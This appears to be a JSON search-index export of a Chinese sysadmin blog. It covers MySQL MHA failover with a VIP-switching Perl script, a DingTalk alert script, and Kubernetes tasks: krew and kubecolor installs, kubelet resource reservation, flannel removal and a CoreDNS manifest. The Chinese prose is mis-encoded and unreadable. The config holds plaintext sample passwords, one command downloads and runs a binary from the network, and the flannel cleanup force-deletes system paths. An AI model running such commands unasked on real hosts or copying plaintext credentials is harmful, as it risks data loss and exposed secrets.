FATAL =\u003e 'all'; use Getopt::Long; use MHA::DBHelper; my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port, $new_master_user, $new_master_password ); my $vip = '172.17.20.243/24'; my $key = \"1\"; my $ssh_start_vip = \"/sbin/ifconfig eth0:$key $vip\"; my $ssh_stop_vip = \"/sbin/ifconfig eth0:$key down\"; GetOptions( 'command=s' =\u003e \\$command, 'ssh_user=s' =\u003e \\$ssh_user, 'orig_master_host=s' =\u003e \\$orig_master_host, 'orig_master_ip=s' =\u003e \\$orig_master_ip, 'orig_master_port=i' =\u003e \\$orig_master_port, 'new_master_host=s' =\u003e \\$new_master_host, 'new_master_ip=s' =\u003e \\$new_master_ip, 'new_master_port=i' =\u003e \\$new_master_port, 'new_master_user=s' =\u003e \\$new_master_user, 'new_master_password=s' =\u003e \\$new_master_password, ); exit \u0026main(); sub main { if ( $command eq \"stop\" || $command eq \"stopssh\" ) { # $orig_master_host, $orig_master_ip, $orig_master_port are passed. # If you manage master ip address at global catalog database, # invalidate orig_master_ip here. my $exit_code = 1; eval { # updating global catalog, etc $exit_code = 0; }; if ($@) { warn \"Got Error: $@\\n\"; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"start\" ) { # all arguments are passed. # If you manage master ip address at global catalog database, # activate new_master_ip here. # You can also grant write access (create user, set read_only=0, etc) here. my $exit_code = 10; eval { print \"Enabling the VIP - $vip on the new master - $new_master_host \\n\"; \u0026start_vip(); \u0026stop_vip(); $exit_code = 0; }; if ($@) { warn $@; exit $exit_code; } exit $exit_code; } elsif ( $command eq \"status\" ) { print \"Checking the Status of the script.. OK \\n\"; `ssh $ssh_user\\@$orig_master_host \\\" $ssh_start_vip \\\"`; exit 0; } else { \u0026usage(); exit 1; } } sub start_vip() { `ssh $ssh_user\\@$new_master_host \\\" $ssh_start_vip \\\"`; } # A simple system call that disable the VIP on the old_master sub stop_vip() { `ssh $ssh_user\\@$orig_master_host \\\" $ssh_stop_vip \\\"`; } sub usage { print \"Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n\"; } 3.ç»™è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ chmod +x /etc/mha/scripts/master_ip_failover 4.ä¿®æ”¹é…ç½®æ–‡ä»¶,åœ¨[server default]éƒ¨åˆ†æ·»åŠ è„šæœ¬å‚æ•° vim /etc/mha/app1.conf [server default] # mysqlç®¡ç†å‘˜ç”¨æˆ·åå¯†ç  user=root password=soulchild # sshçš„ç”¨æˆ· ssh_user=root # ä¸»ä»å¤åˆ¶çš„ç”¨æˆ·åå¯†ç  repl_user=repl_user repl_password=soulchild_repl # mysqläºŒè¿›åˆ¶æ—¥å¿—è·¯å¾„,ä¹Ÿå¯ä»¥å•ç‹¬å†™åœ¨å•ç‹¬serveréƒ¨åˆ†ä¸­ master_binlog_dir=/data/mysql/ # æ‰§è¡ŒpingSQLè¯­å¥çš„é¢‘ç‡ ping_interval=1 # mha-managerçš„æ—¥å¿—è·¯å¾„ manager_log=/var/log/mha/app1/manager.log manager_workdir=/var/log/mha/app1 # vipæ¼‚ç§»è„šæœ¬ master_ip_failover_script=/etc/mha/scripts/master_ip_failover [server1] # mysqlä¸»æœºip hostname=172.17.20.240 port=3306 # ä¼˜å…ˆå°†æ­¤æœåŠ¡å™¨è®¾ç½®ä¸ºä¸» candidate_master=1 # é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœslaveè½åäºmasterè¶…è¿‡100MBçš„ä¸­ç»§æ—¥å¿—,MHAä¸ä¼šé€‰æ‹©è¿™å°ä»ä½œä¸ºæ–°çš„master,è®¾ç½®check_repl_delay=0ä¼šå¿½ç•¥è¿™ä¸ªæœºåˆ¶ check_repl_delay=0 [server2] hostname=172.17.20.241 port=3306 master_binlog_dir=/data/mysql [server3] hostname=172.17.20.242 port=3306 candidate_master=1 5.ç¬¬ä¸€æ¬¡æ‰‹åŠ¨é…ç½®vip # åœ¨å½“å‰masterèŠ‚ç‚¹ä¸­æ·»åŠ  ifconfig eth0:1 172.17.20.243/24 6.é‡æ–°å¯åŠ¨mha-manager masterha_stop --conf=/etc/mha/app1.conf nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 7.æµ‹è¯• ç•¥ï¼Œé‡å¤ä¸Šé¢çš„æ•…éšœæµ‹è¯•æ­¥éª¤ï¼Œæ£€æŸ¥vipæ˜¯å¦å·²æ¼‚ç§» ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:12","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åä¸‰ã€æ•…éšœè½¬ç§»å‘Šè­¦é€šçŸ¥ 1.ä¿®æ”¹é…ç½®æ–‡ä»¶,åœ¨[server default]éƒ¨åˆ†æ·»åŠ å‚æ•° report_script=/etc/mha/scripts/send_dingtalk 2.ç¼–å†™è„šæœ¬ vim /etc/mha/scripts/send_dingtalk #!/usr/bin/python3 # -*- coding: utf-8 -*- import requests import json import sys import os headers = {'Content-Type': 'application/json;charset=utf-8'} api_url = \"https://oapi.dingtalk.com/robot/send?access_token=xxx\" def msg(subject, content): json_text = { \"msgtype\": \"text\", \"text\": { \"content\": subject + '\\n' + content }, } print(requests.post(api_url, json.dumps(json_text), headers=headers).content) if __name__ == '__main__': orig_master_host = sys.argv[1] new_master_host = sys.argv[2] new_slave_hosts = sys.argv[3] subject = sys.argv[4] body = sys.argv[5] msg(\"MHAåˆ‡æ¢å‘Šè­¦\\n\", \"æ—§master: \" + orig_master_host + \"\\n\" + \"æ–°master: \" + new_master_host + \"\\n\" + \"æ–°slave: \" + new_slave_hosts + \"\\n\" + \"subject: \" + subject + \"\\n\" + \"body:\" + body) 3.é‡å¯mha-manager masterha_stop --conf=/etc/mha/app1.conf nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 4.æµ‹è¯• è¯·æŸ¥çœ‹åä¸€ã€æ•…éšœæ¨¡æ‹Ÿ 64189-quqryhyfu4i.png ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:13","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["kubernetes"],"content":"1.æŸ¥æ‰¾podæ‰€å±çš„nodeèŠ‚ç‚¹å’Œå®¹å™¨ID kubectl get pod POD_NAME -o yaml | egrep 'containerID|nodeName' 2.æŸ¥çœ‹å®¹å™¨ç½‘å¡çš„é“¾æ¥ç´¢å¼•å€¼ï¼š kubectl exec -it POD_NAME -- 'cat /sys/class/net/eth0/iflink' # å¦‚æœå®¹å™¨æ²¡æœ‰å‘½ä»¤å¯ä»¥ä½¿ç”¨å…¶ä»–é•œåƒè¿›è¡ŒæŸ¥çœ‹ docker run -it --rm --network container:bba31a6eabfd busybox:1.23 'cat /sys/class/net/eth0/iflink' 34826-mngkhxwzq6m.png é“¾æ¥åˆ°ç´¢å¼•æ˜¯42çš„ç½‘å¡ä¸Š 3.æ ¹æ®ç´¢å¼•å€¼æ‰¾åˆ°å®¿ä¸»æœºç½‘å¡ ip link |grep ^42 76251-iyk6ufvobqo.png 4.æŠ“åŒ… tcpdump -i vetha6b03cb1 port 80 -nn 68833-kcxiuiu3xym.png ","date":"2021-07-02 15:20","objectID":"/post/2556/:0:0","tags":["k8s"],"title":"k8s å¯¹podæŠ“åŒ…","uri":"/post/2556/"},{"categories":["kubernetes"],"content":"bash \u0026 zshä¸€é”®å®‰è£… ( set -x; cd \"$(mktemp -d)\" \u0026\u0026 OS=\"$(uname | tr '[:upper:]' '[:lower:]')\" \u0026\u0026 ARCH=\"$(uname -m | sed -e 's/x86_64/amd64/' -e 's/\\(arm\\)\\(64\\)\\?.*/\\1\\2/' -e 's/aarch64$/arm64/')\" \u0026\u0026 curl -fsSLO \"https://github.com/kubernetes-sigs/krew/releases/latest/download/krew.tar.gz\" \u0026\u0026 tar zxvf krew.tar.gz \u0026\u0026 KREW=./krew-\"${OS}_${ARCH}\" \u0026\u0026 \"$KREW\" install krew ) # é…ç½®ç¯å¢ƒå˜é‡ echo 'export PATH=$PATH:$HOME/.krew/bin' \u003e\u003e ~/.bashrc linux-x86_64 æ‰‹åŠ¨å®‰è£… wget https://github.com/kubernetes-sigs/krew/releases/latest/download/krew.tar.gz tar zxvf krew.tar.gz ./krew-linux_amd64 ./krew-linux_amd64 install krew # é…ç½®ç¯å¢ƒå˜é‡ echo 'export PATH=$PATH:$HOME/.krew/bin' \u003e\u003e ~/.bashrc ","date":"2021-07-02 15:07","objectID":"/post/2553/:0:0","tags":["k8s"],"title":"kubectlæ’ä»¶ç®¡ç†å·¥å…· krewå®‰è£…","uri":"/post/2553/"},{"categories":["kubernetes"],"content":"bashé…ç½® 1.ä¸‹è½½å®‰è£… wget https://github.com//dty1er/kubecolor/releases/download/v0.0.20/kubecolor_0.0.20_Linux_x86_64.tar.gz tar xf kubecolor_0.0.20_Linux_x86_64.tar.gz -C /usr/local/bin/ kubecolor 2.ä¿®æ”¹kubecoloråˆ«åä¸ºk echo 'source\u003c(kubectl completion bash)' \u003e\u003e ~/.bashrc echo 'command -v kubecolor \u003e/dev/null 2\u003e\u00261 \u0026\u0026 alias k=\"kubecolor\"' \u003e\u003e ~/.bashrc echo 'complete -o default -F __start_kubectl k' \u003e\u003e ~/.bashrc 4.ä½¿é…ç½®ç”Ÿæ•ˆ source ~/.bashrc ","date":"2021-07-01 11:13","objectID":"/post/2550/:0:1","tags":["k8s"],"title":"k8s é…ç½®kubecoloré«˜äº®æ˜¾ç¤º","uri":"/post/2550/"},{"categories":["kubernetes"],"content":"zshé…ç½® wget https://github.com//dty1er/kubecolor/releases/download/v0.0.20/kubecolor_0.0.20_Linux_x86_64.tar.gz tar xf kubecolor_0.0.20_Linux_x86_64.tar.gz -C /usr/local/bin/ kubecolor cat \u003e\u003e ~/.zshrc \u003c\u003cEOF source \u003c(kubectl completion zsh) complete -o default -F __start_kubectl kubecolor command -v kubecolor \u003e/dev/null 2\u003e\u00261 \u0026\u0026 alias k=\"kubecolor\" EOF ","date":"2021-07-01 11:13","objectID":"/post/2550/:0:2","tags":["k8s"],"title":"k8s é…ç½®kubecoloré«˜äº®æ˜¾ç¤º","uri":"/post/2550/"},{"categories":["kubernetes"],"content":"åŸæ–‡é“¾æ¥: ä»ä¸€æ¬¡é›†ç¾¤é›ªå´©çœ‹Kubeletèµ„æºé¢„ç•™çš„æ­£ç¡®å§¿åŠ¿ https://my.oschina.net/jxcdwangtao/blog/1629059 ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:0","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"Kubelet Node Allocatable Kubelet Node Allocatableç”¨æ¥ä¸ºKubeç»„ä»¶å’ŒSystemè¿›ç¨‹é¢„ç•™èµ„æºï¼Œä»è€Œä¿è¯å½“èŠ‚ç‚¹å‡ºç°æ»¡è´Ÿè·æ—¶ä¹Ÿèƒ½ä¿è¯Kubeå’ŒSystemè¿›ç¨‹æœ‰è¶³å¤Ÿçš„èµ„æºã€‚ ç›®å‰æ”¯æŒcpu, memory, ephemeral-storageä¸‰ç§èµ„æºé¢„ç•™ã€‚ node Capacity resourcesæ˜¯Nodeçš„æ‰€æœ‰ç¡¬ä»¶èµ„æºï¼Œkube-reserved resourcesæ˜¯ç»™kubeç»„ä»¶é¢„ç•™çš„èµ„æºï¼Œsystem-reserved resourcesæ˜¯ç»™ç³»ç»Ÿè¿›ç¨‹é¢„ç•™çš„èµ„æºï¼Œhard eviction threshold resourcesæ˜¯kubelet evictionçš„é˜ˆå€¼è®¾å®šï¼Œnode allocatable resourcesæ‰æ˜¯çœŸæ­£schedulerè°ƒåº¦Podæ—¶çš„å‚è€ƒå€¼ï¼ˆä¿è¯Nodeä¸Šæ‰€æœ‰Podsçš„request resourceä¸è¶…è¿‡Allocatableï¼‰ã€‚ (nodeå¯ç”¨èµ„æºè®¡ç®—) Node Allocatable Resource = Node Capacity - Kube-reserved - system-reserved - eviction-threshold 25347-qi0e9d2i65j.png ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:1","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"å¦‚ä½•é…ç½® â€“enforce-node-allocatableï¼Œé»˜è®¤ä¸ºpodsï¼Œè¦ä¸ºkubeç»„ä»¶å’ŒSystemè¿›ç¨‹é¢„ç•™èµ„æºï¼Œåˆ™éœ€è¦è®¾ç½®ä¸ºpods,kube-reserved,system-reserveã€‚ â€“cgroups-per-qosï¼ŒEnabling QoS and Pod level cgroupsï¼Œé»˜è®¤å¼€å¯ã€‚å¼€å¯åï¼Œkubeletä¼šå°†ç®¡ç†æ‰€æœ‰workload Podsçš„cgroupsã€‚ â€“cgroup-driverï¼Œé»˜è®¤ä¸ºcgroupfsï¼Œå¦ä¸€å¯é€‰é¡¹ä¸ºsystemdã€‚å–å†³äºå®¹å™¨è¿è¡Œæ—¶ä½¿ç”¨çš„cgroup driverï¼Œkubeletä¸å…¶ä¿æŒä¸€è‡´ã€‚æ¯”å¦‚ä½ é…ç½®dockerä½¿ç”¨systemd cgroup driverï¼Œé‚£ä¹ˆkubeletä¹Ÿéœ€è¦é…ç½®â€“cgroup-driver=systemdã€‚ â€“kube-reserved,ç”¨äºé…ç½®ä¸ºkubeç»„ä»¶ï¼ˆkubelet,kube-proxy,dockerdç­‰ï¼‰é¢„ç•™çš„èµ„æºé‡ï¼Œæ¯”å¦‚â€”kube-reserved=cpu=1000m,memory=8Giï¼Œephemeral-storage=16Giã€‚ â€“kube-reserved-cgroupï¼Œå¦‚æœä½ è®¾ç½®äº†â€“kube-reservedï¼Œé‚£ä¹ˆè¯·ä¸€å®šè¦è®¾ç½®å¯¹åº”çš„cgroupï¼Œå¹¶ä¸”è¯¥cgroupç›®å½•è¦äº‹å…ˆåˆ›å»ºå¥½ï¼Œå¦åˆ™kubeletå°†ä¸ä¼šè‡ªåŠ¨åˆ›å»ºå¯¼è‡´kubeletå¯åŠ¨å¤±è´¥ã€‚æ¯”å¦‚è®¾ç½®ä¸ºkube-reserved-cgroup=/kubelet.service ã€‚ â€“system-reservedï¼Œç”¨äºé…ç½®ä¸ºSystemè¿›ç¨‹é¢„ç•™çš„èµ„æºé‡ï¼Œæ¯”å¦‚â€”system-reserved=cpu=500m,memory=4Gi,ephemeral-storage=4Giã€‚ â€“system-reserved-cgroupï¼Œå¦‚æœä½ è®¾ç½®äº†â€“system-reservedï¼Œé‚£ä¹ˆè¯·ä¸€å®šè¦è®¾ç½®å¯¹åº”çš„cgroupï¼Œå¹¶ä¸”è¯¥cgroupç›®å½•è¦äº‹å…ˆåˆ›å»ºå¥½ï¼Œå¦åˆ™kubeletå°†ä¸ä¼šè‡ªåŠ¨åˆ›å»ºå¯¼è‡´kubeletå¯åŠ¨å¤±è´¥ã€‚æ¯”å¦‚è®¾ç½®ä¸ºsystem-reserved-cgroup=/system.sliceã€‚ â€“eviction-hardï¼Œç”¨æ¥é…ç½®kubeletçš„hard evictionæ¡ä»¶ï¼Œåªæ”¯æŒmemoryå’Œephemeral-storageä¸¤ç§ä¸å¯å‹ç¼©èµ„æºã€‚å½“å‡ºç°MemoryPressureæ—¶ï¼ŒSchedulerä¸ä¼šè°ƒåº¦æ–°çš„Best-Effort QoS Podsåˆ°æ­¤èŠ‚ç‚¹ã€‚å½“å‡ºç°DiskPressureæ—¶ï¼ŒSchedulerä¸ä¼šè°ƒåº¦ä»»ä½•æ–°Podsåˆ°æ­¤èŠ‚ç‚¹ã€‚å…³äºKubelet Evictionçš„æ›´å¤šè§£è¯»ï¼Œè¯·å‚è€ƒæˆ‘çš„ç›¸å…³åšæ–‡ã€‚ Kubelet Node Allocatableçš„ä»£ç å¾ˆç®€å•ï¼Œä¸»è¦åœ¨pkg/kubelet/cm/node_container_manager.goï¼Œæ„Ÿå…´è¶£çš„åŒå­¦è‡ªå·±å»èµ°è¯»ä¸€éã€‚ å…³äºå¦‚ä½•è§„åˆ’Nodeçš„Cgroupç»“æ„ï¼Œè¯·å‚è€ƒå®˜æ–¹å»ºè®®: recommended-cgroups-setup ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:2","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"ç®€å•ç¤ºä¾‹ ä»¥å¦‚ä¸‹çš„kubeletèµ„æºé¢„ç•™ä¸ºä¾‹ï¼ŒNode Capacityä¸ºmemory=32Gi, cpu=16, ephemeral-storage=100Giï¼Œæˆ‘ä»¬å¯¹kubeletè¿›è¡Œå¦‚ä¸‹é…ç½®ï¼š --enforce-node-allocatable=pods,kube-reserved,system-reserved --kube-reserved-cgroup=/kubelet.service --system-reserved-cgroup=/system.slice --kube-reserved=cpu=1,memory=2Gi,ephemeral-storage=1Gi --system-reserved=cpu=500m,memory=1Gi,ephemeral-storage=1Gi --eviction-hard=memory.available\u003c500Mi,nodefs.available\u003c10% æœ€ç»ˆè®¡ç®—ç»“æœ: NodeAllocatable = NodeCapacity - Kube-reserved - system-reserved - eviction-threshold = cpu=14.5,memory=28.5Gi,ephemeral-storage=98Gi. Schedulerä¼šç¡®ä¿Nodeä¸Šæ‰€æœ‰çš„Pod Resource Requestä¸è¶…è¿‡NodeAllocatableã€‚Podsæ‰€ä½¿ç”¨çš„memoryå’Œstorageä¹‹å’Œè¶…è¿‡NodeAllocatableåå°±ä¼šè§¦å‘kubelet Evict Podsã€‚ ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:3","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"æˆ‘è¸©çš„å‘ kube-reserved-cgroupåŠsystem-reserved-cgroupé…ç½® æœ€å¼€å§‹ï¼Œæˆ‘åªå¯¹kubeletåšäº†å¦‚ä¸‹é…ç½®â€“kube-reserved, â€“system-reserved,æˆ‘å°±ä»¥ä¸ºkubeletä¼šè‡ªåŠ¨ç»™kubeå’Œsystemåˆ›å»ºå¯¹åº”çš„Cgroupï¼Œå¹¶è®¾ç½®å¯¹åº”çš„cpu share, memory limitç­‰ï¼Œç„¶åé«˜æ•æ— å¿§äº†ã€‚ ç„¶è€Œå®é™…ä¸Šå¹¶éå¦‚æ­¤ï¼Œç›´åˆ°åœ¨çº¿ä¸Šæœ‰ä¸€æ¬¡æŸä¸ªTensorFlow workerçš„é—®é¢˜ï¼Œæ— é™åˆ¶çš„ä½¿ç”¨èŠ‚ç‚¹çš„cpuï¼Œå¯¼è‡´èŠ‚ç‚¹ä¸Šcpu usageæŒç»­100%è¿è¡Œï¼Œå¹¶ä¸”å‹æ¦¨åˆ°äº†kubeletç»„ä»¶çš„cpuä½¿ç”¨ï¼Œå¯¼è‡´kubeletä¸APIServerçš„å¿ƒè·³æ–­äº†ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¾¿Not Readyäº†ã€‚ æ¥ç€ï¼ŒKubernetesä¼šåœ¨å…¶ä»–æŸä¸ªæœ€ä¼˜çš„Ready Nodeä¸Šå¯åŠ¨è¿™ä¸ªè´ªå©ªçš„workerï¼Œè¿›è€ŒæŠŠè¿™ä¸ªèŠ‚ç‚¹çš„cpuä¹Ÿè·‘æ»¡äº†ï¼ŒèŠ‚ç‚¹Not Readyäº†ã€‚ å¦‚æ­¤å°±å‡ºç°äº†é›†ç¾¤é›ªå´©ï¼Œé›†ç¾¤å†…çš„Nodesé€ä¸ªçš„Not Readyäº†,åæœéå¸¸ä¸¥é‡ã€‚ æŠŠkubletåŠ ä¸Šå¦‚ä¸‹é…ç½®åï¼Œå³å¯ä¿è¯åœ¨Nodeé«˜è´Ÿè·æ—¶ï¼Œä¹Ÿèƒ½ä¿è¯å½“kubeletéœ€è¦cpuæ—¶è‡³å°‘èƒ½æœ‰â€“kube-reservedè®¾ç½®çš„cpu coreså¯ç”¨ã€‚ --enforce-node-allocatable=pods,kube-reserved,system-reserved --kube-reserved-cgroup=/kubelet.service --system-reserved-cgroup=/system.slice æ³¨æ„,å› ä¸ºkube-reservedè®¾ç½®çš„cpuå…¶å®æœ€ç»ˆæ˜¯å†™åˆ°kube-reserved-cgroupä¸‹é¢çš„cpu sharesã€‚äº†è§£cpu sharesçš„åŒå­¦çŸ¥é“ï¼Œåªæœ‰å½“é›†ç¾¤çš„cpuè·‘æ»¡éœ€è¦æŠ¢å æ—¶æ‰ä¼šèµ·ä½œç”¨ï¼Œå› æ­¤ä½ ä¼šçœ‹åˆ°Nodeçš„cpu usageè¿˜æ˜¯æœ‰å¯èƒ½è·‘åˆ°100%çš„ï¼Œä½†æ˜¯ä¸è¦ç´§ï¼Œkubeletç­‰ç»„ä»¶å¹¶æ²¡æœ‰æ”¶åˆ°å½±å“ï¼Œå¦‚æœkubeletæ­¤æ—¶éœ€è¦æ›´å¤šçš„cpuï¼Œé‚£ä¹ˆå®ƒå°±èƒ½æŠ¢åˆ°æ›´å¤šçš„æ—¶é—´ç‰‡ï¼Œæœ€å¤šå¯ä»¥æŠ¢åˆ°kube-reservedè®¾ç½®çš„cpu numsã€‚ ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:4","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"Kubernetesä¼šæ£€æŸ¥çš„cgroup subsystem åœ¨Kubernetes 1.7ç‰ˆæœ¬ï¼ŒKubeletå¯åŠ¨ä¼šæ£€æŸ¥ä»¥ä¸‹cgroup subsystemçš„å­˜åœ¨ï¼š 66962-3c5ft5jbar4.png åœ¨Kubernetes 1.8åŠ1.9ç‰ˆæœ¬ï¼ŒKubeletå¯åŠ¨ä¼šæ£€æŸ¥ä»¥ä¸‹cgroup subsystemçš„å­˜åœ¨ï¼š 06512-bmgk8tochvc.png å¯¹äºCentosç³»ç»Ÿï¼Œcpusetå’Œhugetlb subsystemæ˜¯é»˜è®¤æ²¡æœ‰åˆå§‹åŒ–system.sliceï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œå¦åˆ™ä¼šæŠ¥Failed to start ContainerManager Failed to enforce System Reserved Cgroup Limits on â€œ/system.sliceâ€: â€œ/system.sliceâ€ cgroup does not existçš„é”™è¯¯æ—¥å¿—ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨kubelet serviceä¸­é…ç½®ExecStartPreæ¥å®ç°ã€‚ 79097-8gp5vn1w0z2.png ","date":"2021-06-30 09:27","objectID":"/post/2539/:0:5","tags":["k8s"],"title":"k8s-nodeèŠ‚ç‚¹èµ„æºé¢„ç•™ç›¸å…³é…ç½®","uri":"/post/2539/"},{"categories":["kubernetes"],"content":"1.åˆ é™¤flannel # k8séƒ¨ç½²çš„ kubectl delete daemonset -n kube-system kube-flannel # äºŒè¿›åˆ¶éƒ¨ç½²çš„ systemctl stop flanneld rm -f /etc/systemd/system/flanneld.service rm -f /usr/local/bin/flanneld 2.åˆ é™¤flannelå’Œcniç½‘å¡ç­‰é…ç½® # cni ifconfig cni0 down ip link delete cni0 rm -rf /var/lib/cni/ rm -f /etc/cni/net.d/* # flannel ifconfig flannel.1 down ip link delete flannel.1 rm -fr /var/run/flannel/ rm -fr /etc/kube-flannel 3.æ‰‹åŠ¨æ¸…é™¤è·¯ç”± route del -net 10.244.x.x/24 gw xxx.xxx.xxx.xxx 4.é‡å¯kubelet systemctl restart kubelet ","date":"2021-06-29 17:06","objectID":"/post/2525/:0:0","tags":["k8s"],"title":"flannelå®Œå…¨å¸è½½","uri":"/post/2525/"},{"categories":["kubernetes"],"content":"æ·»åŠ æ±¡ç‚¹ kubectl taint node 172.17.20.201 node-role.kubernetes.io/master:NoSchedule kubectl taint node 172.17.20.202 node-role.kubernetes.io/master:NoSchedule kubectl taint node 172.17.20.203 node-role.kubernetes.io/master:NoSchedule é…ç½®è§’è‰²æ ‡ç­¾ kubectl label nodes 172.17.20.201 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.201 node-role.kubernetes.io/control-plane= kubectl label nodes 172.17.20.202 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.202 node-role.kubernetes.io/control-plane= kubectl label nodes 172.17.20.203 node-role.kubernetes.io/master= kubectl label nodes 172.17.20.203 node-role.kubernetes.io/control-plane= ","date":"2021-06-28 21:13","objectID":"/post/2536/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-é…ç½®masteræ±¡ç‚¹å’Œrole lable(åå››)","uri":"/post/2536/"},{"categories":["kubernetes"],"content":"ä¸€ã€ä¸‹è½½yaml corednsä½¿ç”¨k8séƒ¨ç½²,å®˜æ–¹æä¾›çš„æ¨¡æ¿:https://github.com/coredns/deployment/blob/master/kubernetes/coredns.yaml.sed ä¸‹è½½åçš„yamléœ€è¦æ›¿æ¢å¦‚ä¸‹å­—æ®µ # è¿™ä¸ªå¯¹åº”kubeletçš„DNS CLUSTER_DNS_IP: 10.1.0.10 CLUSTER_DOMAIN: cluster.local REVERSE_CIDRS: in-addr.arpa ip6.arpa STUBDOMAINS: æ—  UPSTREAMNAMESERVER: /etc/resolv.conf # ä¿®æ”¹é•œåƒä¸º1.7.1 coredns/coredns:1.7.1 ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-corednså®‰è£…(åä¸‰)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"äºŒã€éƒ¨ç½² ä¿®æ”¹åçš„coredns.yaml apiVersion: v1 kind: ServiceAccount metadata: name: coredns namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: labels: kubernetes.io/bootstrapping: rbac-defaults name: system:coredns rules: - apiGroups: - \"\" resources: - endpoints - services - pods - namespaces verbs: - list - watch - apiGroups: - discovery.k8s.io resources: - endpointslices verbs: - list - watch --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \"true\" labels: kubernetes.io/bootstrapping: rbac-defaults name: system:coredns roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:coredns subjects: - kind: ServiceAccount name: coredns namespace: kube-system --- apiVersion: v1 kind: ConfigMap metadata: name: coredns namespace: kube-system data: Corefile: | .:53 { errors health { lameduck 5s } ready kubernetes cluster.local in-addr.arpa ip6.arpa { fallthrough in-addr.arpa ip6.arpa } prometheus :9153 forward . /etc/resolv.conf { max_concurrent 1000 } cache 30 loop reload loadbalance } --- apiVersion: apps/v1 kind: Deployment metadata: name: coredns namespace: kube-system labels: k8s-app: kube-dns kubernetes.io/name: \"CoreDNS\" spec: # replicas: not specified here: # 1. Default is 1. # 2. Will be tuned in real time if DNS horizontal auto-scaling is turned on. strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 1 selector: matchLabels: k8s-app: kube-dns template: metadata: labels: k8s-app: kube-dns spec: priorityClassName: system-cluster-critical serviceAccountName: coredns tolerations: - key: \"CriticalAddonsOnly\" operator: \"Exists\" nodeSelector: kubernetes.io/os: linux affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: k8s-app operator: In values: [\"kube-dns\"] topologyKey: kubernetes.io/hostname containers: - name: coredns image: coredns/coredns:1.7.1 imagePullPolicy: IfNotPresent resources: limits: memory: 170Mi requests: cpu: 100m memory: 70Mi args: [ \"-conf\", \"/etc/coredns/Corefile\" ] volumeMounts: - name: config-volume mountPath: /etc/coredns readOnly: true ports: - containerPort: 53 name: dns protocol: UDP - containerPort: 53 name: dns-tcp protocol: TCP - containerPort: 9153 name: metrics protocol: TCP securityContext: allowPrivilegeEscalation: false capabilities: add: - NET_BIND_SERVICE drop: - all readOnlyRootFilesystem: true livenessProbe: httpGet: path: /health port: 8080 scheme: HTTP initialDelaySeconds: 60 timeoutSeconds: 5 successThreshold: 1 failureThreshold: 5 readinessProbe: httpGet: path: /ready port: 8181 scheme: HTTP dnsPolicy: Default volumes: - name: config-volume configMap: name: coredns items: - key: Corefile path: Corefile --- apiVersion: v1 kind: Service metadata: name: kube-dns namespace: kube-system annotations: prometheus.io/port: \"9153\" prometheus.io/scrape: \"true\" labels: k8s-app: kube-dns kubernetes.io/cluster-service: \"true\" kubernetes.io/name: \"CoreDNS\" spec: selector: k8s-app: kube-dns clusterIP: 10.1.0.10 ports: - name: dns port: 53 protocol: UDP - name: dns-tcp port: 53 protocol: TCP - name: metrics port: 9153 protocol: TCP éƒ¨ç½² kubectl apply -f coredns.yaml ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-corednså®‰è£…(åä¸‰)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"ä¸‰ã€æµ‹è¯• # 